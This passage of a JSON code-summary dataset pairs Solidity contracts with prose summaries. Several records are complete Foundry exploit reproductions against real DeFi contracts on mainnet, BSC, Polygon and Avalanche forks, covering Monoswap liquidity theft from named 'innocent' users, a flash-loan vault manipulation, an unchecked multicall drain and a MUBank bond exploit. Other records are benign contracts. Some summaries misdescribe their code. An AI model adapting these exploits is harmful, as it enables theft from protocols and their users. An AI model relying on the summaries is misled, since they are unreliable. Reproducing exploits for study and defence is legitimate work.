exactDividedBy2And3(uint _a) override {\n    //     _;\n    // }\n}\n\n",
        "summary": "This is a Solidity smart contract that contains two contracts: \"Base1\" and \"Identifier\". \"Base1\" contains a modifier that checks if a given input is divisible by both 2 and 3. \"Identifier\" inherits from \"Base1\", and contains two functions. The first function, \"getExactDividedBy2And3\", calls the modifier from \"Base1\" to ensure the input is divisible by both 2 and 3, and then returns the quotient from dividing the input by 2 and 3 respectively. The second function, \"getExactDividedBy2And3WithoutModifier\", calculates the quotient from dividing the input by 2 and 3 without calling the modifier. There is also commented-out code that shows how to override the modifier in \"Base1\" in case the contract needs to modify its behavior.",
        "id": "2ce8bc70-7a0c-402a-8320-bb1a15a43c91"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n  USDC usdc = USDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n  MonoToken mono = MonoToken(0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D);\n  Monoswap monoswap = Monoswap(0xC36a7887786389405EA8DA0B87602Ae3902B88A1);\n  MonoXPool monopool = MonoXPool(0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4);\n  address Monoswap_address = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;\n  address Mono_Token_Address = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;\n  address WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n  address Innocent_user_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;\n  address Innocent_user_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;\n  address Innocent_user_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;\n  address USDC_Address = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n  uint256 Amount_Of_MonoToken_On_XPool;\n\n  uint256 public Amount_Of_USDC_On_XPool;\n\n  uint256 public Amoount_Of_Mono_On_This;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13715025); //fork mainnet at block 13715025\n  }\n\n  function testExploit() public {\n    mono.approve(Monoswap_address, type(uint256).max);\n\n    WETH.deposit{ value: address(this).balance, gas: 40000 }();\n    // WETH.balanceOf(address(this));\n    // VISR_Balance =  visr.balanceOf(msg.sender);\n    emit log_named_uint(\"WETH Balance\", WETH.balanceOf(address(this)));\n    WETH.approve(Monoswap_address, 0.1 ether);\n    monoswap.swapExactTokenForToken(\n      WETH9_Address,\n      Mono_Token_Address,\n      0.1 ether,\n      1,\n      address(this),\n      block.timestamp\n    );\n    emit log_named_uint(\"MonoToken Balance\", mono.balanceOf(address(this)));\n    RemoveLiquidity_From_3_Users();\n    // AddLiquidity For myself\n    monoswap.addLiquidity(Mono_Token_Address, 196875656, address(this));\n\n    Swap_Mono_for_Mono_55_Times();\n\n    Swap_Mono_For_USDC();\n\n    emit log_named_uint(\n      \"Exploit completed, USDC Balance\",\n      usdc.balanceOf(msg.sender)\n    );\n  }\n\n  function RemoveLiquidity_From_3_Users() internal {\n    uint256 balance_Of_User1 = monopool.balanceOf(Innocent_user_1, 10);\n\n    monoswap.removeLiquidity(\n      Mono_Token_Address,\n      balance_Of_User1,\n      Innocent_user_1,\n      0,\n      1\n    );\n\n    uint256 balance_Of_User2 = monopool.balanceOf(Innocent_user_2, 10);\n\n    monoswap.removeLiquidity(\n      Mono_Token_Address,\n      balance_Of_User2,\n      Innocent_user_2,\n      0,\n      1\n    );\n\n    uint256 balance_Of_User3 = monopool.balanceOf(Innocent_user_3, 10);\n\n    monoswap.removeLiquidity(\n      Mono_Token_Address,\n      balance_Of_User3,\n      Innocent_user_3,\n      0,\n      1\n    );\n  }\n\n  function Swap_Mono_for_Mono_55_Times() internal {\n    for (uint256 i = 0; i < 55; i++) {\n      (, , , , , , Amount_Of_MonoToken_On_XPool, , ) = monoswap.pools(\n        Mono_Token_Address\n      );\n\n      monoswap.swapExactTokenForToken(\n        Mono_Token_Address,\n        Mono_Token_Address,\n        Amount_Of_MonoToken_On_XPool - 1,\n        0,\n        address(this),\n        block.timestamp\n      );\n    }\n  }\n\n  function Swap_Mono_For_USDC() internal {\n    (, , , , , , Amount_Of_USDC_On_XPool, , ) = monoswap.pools(USDC_Address);\n\n    Amoount_Of_Mono_On_This = mono.balanceOf(address(this));\n\n    monoswap.swapTokenForExactToken(\n      Mono_Token_Address,\n      USDC_Address,\n      Amoount_Of_Mono_On_This,\n      4000000000000,\n      msg.sender,\n      block.timestamp\n    );\n  }\n\n  receive() external payable {}\n\n  function onERC1155Received(\n    address _operator,\n    address _from,\n    uint256 _id,\n    uint256 _value,\n    bytes calldata _data\n  ) external returns (bytes4) {\n    bytes4 a = 0xf23a6e61;\n    return a;\n  }\n}\n",
        "summary": "This code is a Solidity contract that tests an exploit in a smart contract called Monoswap. The contract imports other Solidity contracts that represent various tokens and interfaces. The `setUp()` function sets up a fork of the mainnet at a specific block. The `testExploit()` function tests the exploit by performing several operations such as swapping tokens on Monoswap, adding and removing liquidity, and swapping Mono tokens for USDC. The contract also includes helper functions such as `RemoveLiquidity_From_3_Users()`, `Swap_Mono_for_Mono_55_Times()`, and `Swap_Mono_For_USDC()`. Finally, the contract includes a fallback function and an implementation of the `onERC1155Received()` function, which is a callback function that is triggered when the contract receives an ERC1155 token.",
        "id": "8cca8dcc-9bf6-44ed-9061-790ff3b607da"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1589501207181393920\n// https://twitter.com/CertiKAlert/status/1589428153591615488\n// TX\n// https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e\n\ninterface VBUSD {\n    function mint(uint256 mintAmount) external;\n    function redeemUnderlying(uint256 redeemAmount) external;\n}\n\ninterface VCAKE {\n    function borrow(uint256 borrowAmount) external;\n    function repayBorrow(uint256 repayAmount) external;\n}\n\ninterface BeefyVault {\n    function depositAll() external;\n    function withdrawAll() external;\n}\n\ninterface StrategySyrup {\n    function harvest() external;\n}\n\ncontract Harvest {\n    constructor(){\n        StrategySyrup strategySyrup = StrategySyrup(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b);\n        strategySyrup.harvest();\n    }\n}\n\ninterface Unitroller {\n    function getAccountLiquidity(address account) external returns(uint, uint, uint);  \n    function enterMarkets(address[] calldata vTokens) external;   \n}\n\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 CTK = IERC20(0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 CAKE = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);\n    VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);\n    VCAKE vCAKE = VCAKE(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);\n    BeefyVault beefyVault = BeefyVault(0x489afbAED0Ea796712c9A6d366C16CA3876D8184);\n    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    address constant SmartChef = 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode \n        cheats.createSelectFork(\"bsc\", 22832427);\n    }\n\n    function testExploit() public{\n        address(WBNB).call{value: 3 ether}(\"\");\n        WBNBToCTK();\n        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));\n        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker CAKE balance after exploit\",\n            CAKE.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        address [] memory cTokens = new address[](2);\n        cTokens[0] = address(vBUSD);\n        cTokens[1] = address(vCAKE);\n        unitroller.enterMarkets(cTokens);\n        BUSD.approve(address(vBUSD), type(uint).max);\n        vBUSD.mint(BUSD.balanceOf(address(this)));\n        vCAKE.borrow(50_000 * 1e18);\n        CAKE.approve(address(beefyVault), type(uint).max);\n        beefyVault.depositAll();\n        // Removing this step, the profit seem to be higher \ud83d\ude02\n        // because the harveset() funciton will swap some CAKE to WBNB\n        Harvest harvest = new Harvest();\n        beefyVault.withdrawAll();\n        CAKE.approve(address(vCAKE), type(uint).max);\n        vCAKE.repayBorrow(50_000 * 1e18);\n        vBUSD.redeemUnderlying(400_000 * 1e18);\n        BUSD.transfer(dodo, 400_000 * 1e18);\n    }\n\n    function WBNBToCTK() internal {\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(CTK);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n}",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in a DeFi protocol. It defines several interfaces for interacting with various DeFi contracts, including VBUSD, VCAKE, BeefyVault, and StrategySyrup. It also includes a ContractTest contract that tests the exploit. The exploit involves flash borrowing BUSD, depositing it into BeefyVault to earn CAKE rewards, harvesting the rewards, and then swapping them back for BUSD. This cycle is repeated several times to accrue a large profit before repaying the borrowed BUSD and closing the transactions. The code also includes methods for setting up the attack, such as providing ETH and approving token transactions.",
        "id": "9a0d9544-3ba5-4d51-aaf4-2034d02c4c57"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Address https://polygonscan.com/address/0x940ce652a51ebadb5df09d605dbeda95fdcf697b\ninterface Target {\n    struct Call {\n    address target;\n    bytes callData;\n    uint256 value;\n}\n    function multicallWithoutCheck(Call[] memory calls) external;\n}\n\ncontract ContractTest is DSTest{\n    struct Call {\n    address target;\n    bytes callData;\n    uint256 value;\n}\n    Target target = Target(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b);\n    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n\n    function setUp() public {\n        cheats.createSelectFork(\"polygon\", 34743770);\n    }\n\n    function testExploit() public{\n        uint USDTBlance = USDT.balanceOf(address(target));\n        bytes memory data = abi.encodeWithSignature(\"transfer(address,uint256)\", address(this), USDTBlance);\n        Target.Call memory inputData = Target.Call({\n            target: address(USDT),\n            callData: data,\n            value: 0\n        });\n        Target.Call [] memory calls = new Target.Call[](1);\n        calls[0] = inputData;\n        target.multicallWithoutCheck(calls);\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            6\n        );\n    }\n\n}",
        "summary": "This is a smart contract written in Solidity that tests an exploit on another contract's function. It imports a test contract and an interface. The interface defines the functions and events of another contract called `Target`, which has a `multicallWithoutCheck` function that can execute multiple function calls in a single transaction. The `ContractTest` contract initializes instances of `Target`, `IERC20` and `CheatCodes` contracts, which will be used to execute the exploit. It sets up a testing environment and defines a function called `testExploit` that transfers funds of another ERC-20 token called USDT from the `Target` contract to the attacker's address. Finally, an emitted event displays the attacker's USDT balance after the exploit.",
        "id": "ab42aa2b-3589-4c24-b895-dd0151d2135b"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  struct MyStruct {\n    string str;\n    uint i;\n  }\n\n  MyStruct myStruct;\n\n  function MyContract() {\n    myStruct = MyStruct(\"foo\", 1);\n  }\n\n  function myMethod() external returns (string, uint) {\n    return (myStruct.str, myStruct.i);\n  }\n}\n",
        "summary": "This is a simple Solidity smart contract that defines a struct called \"MyStruct\", with two fields: a string \"str\" and an unsigned integer \"i\". \n\nThe contract initializes an instance of MyStruct in the constructor with the values \"foo\" and 1. \n\nThe function \"myMethod\" returns the values stored in the MyStruct instance: the string and unsigned integer. The function is marked as \"external\", meaning it can be called from outside the contract.",
        "id": "194330ef-b521-4a5e-b7f2-95316ba65adb"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport {Auth, Authority} from \"../Auth.sol\";\n\n/// @notice Flexible and target agnostic role based Authority that supports up to 256 roles.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/auth/authorities/MultiRolesAuthority.sol)\ncontract MultiRolesAuthority is Auth, Authority {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event UserRoleUpdated(address indexed user, uint8 indexed role, bool enabled);\n\n    event PublicCapabilityUpdated(bytes4 indexed functionSig, bool enabled);\n\n    event RoleCapabilityUpdated(uint8 indexed role, bytes4 indexed functionSig, bool enabled);\n\n    event TargetCustomAuthorityUpdated(address indexed target, Authority indexed authority);\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(address _owner, Authority _authority) Auth(_owner, _authority) {}\n\n    /*//////////////////////////////////////////////////////////////\n                     CUSTOM TARGET AUTHORITY STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(address => Authority) public getTargetCustomAuthority;\n\n    /*//////////////////////////////////////////////////////////////\n                            ROLE/USER STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    mapping(address => bytes32) public getUserRoles;\n\n    mapping(bytes4 => bool) public isCapabilityPublic;\n\n    mapping(bytes4 => bytes32) public getRolesWithCapability;\n\n    function doesUserHaveRole(address user, uint8 role) public view virtual returns (bool) {\n        return (uint256(getUserRoles[user]) >> role) & 1 != 0;\n    }\n\n    function doesRoleHaveCapability(uint8 role, bytes4 functionSig) public view virtual returns (bool) {\n        return (uint256(getRolesWithCapability[functionSig]) >> role) & 1 != 0;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           AUTHORIZATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function canCall(\n        address user,\n        address target,\n        bytes4 functionSig\n    ) public view virtual override returns (bool) {\n        Authority customAuthority = getTargetCustomAuthority[target];\n\n        if (address(customAuthority) != address(0)) return customAuthority.canCall(user, target, functionSig);\n\n        return\n            isCapabilityPublic[functionSig] || bytes32(0) != getUserRoles[user] & getRolesWithCapability[functionSig];\n    }\n\n    /*///////////////////////////////////////////////////////////////\n               CUSTOM TARGET AUTHORITY CONFIGURATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setTargetCustomAuthority(address target, Authority customAuthority) public virtual requiresAuth {\n        getTargetCustomAuthority[target] = customAuthority;\n\n        emit TargetCustomAuthorityUpdated(target, customAuthority);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                  PUBLIC CAPABILITY CONFIGURATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setPublicCapability(bytes4 functionSig, bool enabled) public virtual requiresAuth {\n        isCapabilityPublic[functionSig] = enabled;\n\n        emit PublicCapabilityUpdated(functionSig, enabled);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                       USER ROLE ASSIGNMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setUserRole(\n        address user,\n        uint8 role,\n        bool enabled\n    ) public virtual requiresAuth {\n        if (enabled) {\n            getUserRoles[user] |= bytes32(1 << role);\n        } else {\n            getUserRoles[user] &= ~bytes32(1 << role);\n        }\n\n        emit UserRoleUpdated(user, role, enabled);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                   ROLE CAPABILITY CONFIGURATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function setRoleCapability(\n        uint8 role,\n        bytes4 functionSig,\n        bool enabled\n    ) public virtual requiresAuth {\n        if (enabled) {\n            getRolesWithCapability[functionSig] |= bytes32(1 << role);\n        } else {\n            getRolesWithCapability[functionSig] &= ~bytes32(1 << role);\n        }\n\n        emit RoleCapabilityUpdated(role, functionSig, enabled);\n    }\n}\n",
        "summary": "This code defines a contract called \"MultiRolesAuthority\" that implements a flexible and target agnostic role-based authority that supports multiple roles (up to 256). It keeps track of user roles, public and role capabilities, and custom target authority. It also defines various functions for setting and updating these data structures. Additionally, it includes authorization logic to check if a user has permission to call a specific function on a target.",
        "id": "b11dc0cb-7c2e-44fe-b727-2f56f88813fa"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// author: @0xAA_Science from wtf.academy\npragma solidity ^0.8.4;\n\n/// \u57fa\u4e8e\u7b7e\u540d\u7684\u591a\u7b7e\u94b1\u5305\uff0c\u7531gnosis safe\u5408\u7ea6\u7b80\u5316\u800c\u6765\uff0c\u6559\u5b66\u4f7f\u7528\u3002\ncontract MultisigWallet {\n    event ExecutionSuccess(bytes32 txHash);    // \u4ea4\u6613\u6210\u529f\u4e8b\u4ef6\n    event ExecutionFailure(bytes32 txHash);    // \u4ea4\u6613\u5931\u8d25\u4e8b\u4ef6\n    address[] public owners;                   // \u591a\u7b7e\u6301\u6709\u4eba\u6570\u7ec4 \n    mapping(address => bool) public isOwner;   // \u8bb0\u5f55\u4e00\u4e2a\u5730\u5740\u662f\u5426\u4e3a\u591a\u7b7e\n    uint256 public ownerCount;                 // \u591a\u7b7e\u6301\u6709\u4eba\u6570\u91cf\n    uint256 public threshold;                  // \u591a\u7b7e\u6267\u884c\u95e8\u69db\uff0c\u4ea4\u6613\u81f3\u5c11\u6709n\u4e2a\u591a\u7b7e\u4eba\u7b7e\u540d\u624d\u80fd\u88ab\u6267\u884c\u3002\n    uint256 public nonce;                      // nonce\uff0c\u9632\u6b62\u7b7e\u540d\u91cd\u653e\u653b\u51fb\n\n    receive() external payable {}\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316owners, isOwner, ownerCount, threshold \n    constructor(        \n        address[] memory _owners,\n        uint256 _threshold\n    ) {\n        _setupOwners(_owners, _threshold);\n    }\n\n    /// @dev \u521d\u59cb\u5316owners, isOwner, ownerCount,threshold \n    /// @param _owners: \u591a\u7b7e\u6301\u6709\u4eba\u6570\u7ec4\n    /// @param _threshold: \u591a\u7b7e\u6267\u884c\u95e8\u69db\uff0c\u81f3\u5c11\u6709\u51e0\u4e2a\u591a\u7b7e\u4eba\u7b7e\u7f72\u4e86\u4ea4\u6613\n    function _setupOwners(address[] memory _owners, uint256 _threshold) internal {\n        // threshold\u6ca1\u88ab\u521d\u59cb\u5316\u8fc7\n        require(threshold == 0, \"WTF5000\");\n        // \u591a\u7b7e\u6267\u884c\u95e8\u69db \u5c0f\u4e8e \u591a\u7b7e\u4eba\u6570\n        require(_threshold <= _owners.length, \"WTF5001\");\n        // \u591a\u7b7e\u6267\u884c\u95e8\u69db\u81f3\u5c11\u4e3a1\n        require(_threshold >= 1, \"WTF5002\");\n\n        for (uint256 i = 0; i < _owners.length; i++) {\n            address owner = _owners[i];\n            // \u591a\u7b7e\u4eba\u4e0d\u80fd\u4e3a0\u5730\u5740\uff0c\u672c\u5408\u7ea6\u5730\u5740\uff0c\u4e0d\u80fd\u91cd\u590d\n            require(owner != address(0) && owner != address(this) && !isOwner[owner], \"WTF5003\");\n            owners.push(owner);\n            isOwner[owner] = true;\n        }\n        ownerCount = _owners.length;\n        threshold = _threshold;\n    }\n\n    /// @dev \u5728\u6536\u96c6\u8db3\u591f\u7684\u591a\u7b7e\u7b7e\u540d\u540e\uff0c\u6267\u884c\u4ea4\u6613\n    /// @param to \u76ee\u6807\u5408\u7ea6\u5730\u5740\n    /// @param value msg.value\uff0c\u652f\u4ed8\u7684\u4ee5\u592a\u574a\n    /// @param data calldata\n    /// @param signatures \u6253\u5305\u7684\u7b7e\u540d\uff0c\u5bf9\u5e94\u7684\u591a\u7b7e\u5730\u5740\u7531\u5c0f\u5230\u8fbe\uff0c\u65b9\u4fbf\u68c0\u67e5\u3002 ({bytes32 r}{bytes32 s}{uint8 v}) (\u7b2c\u4e00\u4e2a\u591a\u7b7e\u7684\u7b7e\u540d, \u7b2c\u4e8c\u4e2a\u591a\u7b7e\u7684\u7b7e\u540d ... )\n    function execTransaction(\n        address to,\n        uint256 value,\n        bytes memory data,\n        bytes memory signatures\n    ) public payable virtual returns (bool success) {\n        // \u7f16\u7801\u4ea4\u6613\u6570\u636e\uff0c\u8ba1\u7b97\u54c8\u5e0c\n        bytes32 txHash = encodeTransactionData(to, value, data, nonce, block.chainid);\n        nonce++;  // \u589e\u52a0nonce\n        checkSignatures(txHash, signatures); // \u68c0\u67e5\u7b7e\u540d\n        // \u5229\u7528call\u6267\u884c\u4ea4\u6613\uff0c\u5e76\u83b7\u53d6\u4ea4\u6613\u7ed3\u679c\n        (success, ) = to.call{value: value}(data);\n        require(success , \"WTF5004\");\n        if (success) emit ExecutionSuccess(txHash);\n        else emit ExecutionFailure(txHash);\n    }\n\n    /**\n     * @dev \u68c0\u67e5\u7b7e\u540d\u548c\u4ea4\u6613\u6570\u636e\u662f\u5426\u5bf9\u5e94\u3002\u5982\u679c\u662f\u65e0\u6548\u7b7e\u540d\uff0c\u4ea4\u6613\u4f1arevert\n     * @param dataHash \u4ea4\u6613\u6570\u636e\u54c8\u5e0c\n     * @param signatures \u51e0\u4e2a\u591a\u7b7e\u7b7e\u540d\u6253\u5305\u5728\u4e00\u8d77\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory signatures\n    ) public view {\n        // \u8bfb\u53d6\u591a\u7b7e\u6267\u884c\u95e8\u69db\n        uint256 _threshold = threshold;\n        require(_threshold > 0, \"WTF5005\");\n\n        // \u68c0\u67e5\u7b7e\u540d\u957f\u5ea6\u8db3\u591f\u957f\n        require(signatures.length >= _threshold * 65, \"WTF5006\");\n\n        // \u901a\u8fc7\u4e00\u4e2a\u5faa\u73af\uff0c\u68c0\u67e5\u6536\u96c6\u7684\u7b7e\u540d\u662f\u5426\u6709\u6548\n        // \u5927\u6982\u601d\u8def\uff1a\n        // 1. \u7528ecdsa\u5148\u9a8c\u8bc1\u7b7e\u540d\u662f\u5426\u6709\u6548\n        // 2. \u5229\u7528 currentOwner > lastOwner \u786e\u5b9a\u7b7e\u540d\u6765\u81ea\u4e0d\u540c\u591a\u7b7e\uff08\u591a\u7b7e\u5730\u5740\u9012\u589e\uff09\n        // 3. \u5229\u7528 isOwner[currentOwner] \u786e\u5b9a\u7b7e\u540d\u8005\u4e3a\u591a\u7b7e\u6301\u6709\u4eba\n        address lastOwner = address(0); \n        address currentOwner;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i;\n        for (i = 0; i < _threshold; i++) {\n            (v, r, s) = signatureSplit(signatures, i);\n            // \u5229\u7528ecrecover\u68c0\u67e5\u7b7e\u540d\u662f\u5426\u6709\u6548\n            currentOwner = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v, r, s);\n            require(currentOwner > lastOwner && isOwner[currentOwner], \"WTF5007\");\n            lastOwner = currentOwner;\n        }\n    }\n    \n    /// \u5c06\u5355\u4e2a\u7b7e\u540d\u4ece\u6253\u5305\u7684\u7b7e\u540d\u5206\u79bb\u51fa\u6765\n    /// @param signatures \u6253\u5305\u7684\u591a\u7b7e\n    /// @param pos \u8981\u8bfb\u53d6\u7684\u591a\u7b7eindex.\n    function signatureSplit(bytes memory signatures, uint256 pos)\n        internal\n        pure\n        returns (\n            uint8 v,\n            bytes32 r,\n            bytes32 s\n        )\n    {\n        // \u7b7e\u540d\u7684\u683c\u5f0f\uff1a{bytes32 r}{bytes32 s}{uint8 v}\n        assembly {\n            let signaturePos := mul(0x41, pos)\n            r := mload(add(signatures, add(signaturePos, 0x20)))\n            s := mload(add(signatures, add(signaturePos, 0x40)))\n            v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff)\n        }\n    }\n\n    /// @dev \u7f16\u7801\u4ea4\u6613\u6570\u636e\n    /// @param to \u76ee\u6807\u5408\u7ea6\u5730\u5740\n    /// @param value msg.value\uff0c\u652f\u4ed8\u7684\u4ee5\u592a\u574a\n    /// @param data calldata\n    /// @param _nonce \u4ea4\u6613\u7684nonce.\n    /// @param chainid \u94feid\n    /// @return \u4ea4\u6613\u54c8\u5e0cbytes.\n    function encodeTransactionData(\n        address to,\n        uint256 value,\n        bytes memory data,\n        uint256 _nonce,\n        uint256 chainid\n    ) public pure returns (bytes32) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    to,\n                    value,\n                    keccak256(data),\n                    _nonce,\n                    chainid\n                )\n            );\n        return safeTxHash;\n    }\n}\n",
        "summary": "This is a Solidity contract for a multisig wallet that allows multiple people to control a shared wallet. The contract initializes the owners, sets the threshold for required approvals for a transaction to be executed, and checks the signatures of those who approve the transaction. Once enough signatures are gathered, the contract executes the transaction. The contract also includes events to log successful and failed transactions, as well as a fallback function to receive ETH.",
        "id": "b3e0a720-dca6-4482-8076-73712e3d68d5"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1601422462012469248\n// @TX\n// https://snowtrace.io/tx/0xab39a17cdc200c812ecbb05aead6e6f574712170eafbd73736b053b168555680\n\ninterface MUBank{\n    function mu_bond(address stable, uint256 amount) external;\n    function mu_gold_bond(address stable, uint256 amount) external;\n}\n\ncontract ContractTest is DSTest{\n    MUBank Bank = MUBank(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab);\n    IERC20 MU = IERC20(0xD036414fa2BCBb802691491E323BFf1348C5F4Ba);\n    IERC20 MUG = IERC20(0xF7ed17f0Fb2B7C9D3DDBc9F0679b2e1098993e81);\n    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);\n    Uni_Router_V2 Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x67d9aAb77BEDA392b1Ed0276e70598bf2A22945d); // MU MUG\n    uint FlashLoanAmount;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 23435294);\n    }\n\n    function testExploit() public{\n        MU.approve(address(Router), type(uint).max);\n        MUG.approve(address(Router), type(uint).max);\n        USDC_e.approve(address(Router), type(uint).max);\n        USDC_e.approve(address(Bank), type(uint).max);\n        FlashLoanAmount = MU.balanceOf(address(Pair)) - 1;\n        Pair.swap(FlashLoanAmount, 0, address(this), new bytes(1));\n        MUGToUSDC_e();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC.e balance after exploit\",\n            USDC_e.balanceOf(address(this)),\n            6\n        );\n\n    }\n\n    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        MUToUSDC_e();\n        Bank.mu_bond(address(USDC_e), 3_300 * 1e18);\n        Bank.mu_gold_bond(address(USDC_e), 6_990 * 1e18);\n        USDC_eToMU();\n        MU.transfer(address(Pair), FlashLoanAmount * 1000 / 997 + 1000);\n        \n    }\n\n    function MUToUSDC_e() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(MU);\n        path[1] = address(USDC_e);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            MU.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function USDC_eToMU() internal {\n        address [] memory path = new address[](2);\n        path[0] = address(USDC_e);\n        path[1] = address(MU);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDC_e.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function MUGToUSDC_e() internal {\n        address [] memory path = new address[](3);\n        path[0] = address(MUG);\n        path[1] = address(MU);\n        path[2] = address(USDC_e);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            MUG.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}",
        "summary": "This is a Solidity smart contract that aims to exploit a vulnerability found in a third-party contract named MUBank. The contract imports other contracts and interfaces, including a testing framework and several ERC20 token contracts. The exploit involves calling a function on MUBank and flash borrowing MU tokens from a Uniswap pair and executing several token swaps before transferring an amount of MU tokens back to the Uniswap pair. The end goal is to increase the balance of USDC.e tokens held by the attacker. The contract also includes a function that sets up a fork for testing purposes.",
        "id": "1f81c7c8-4f69-462f-b73d-e83091741059"
    },
    {
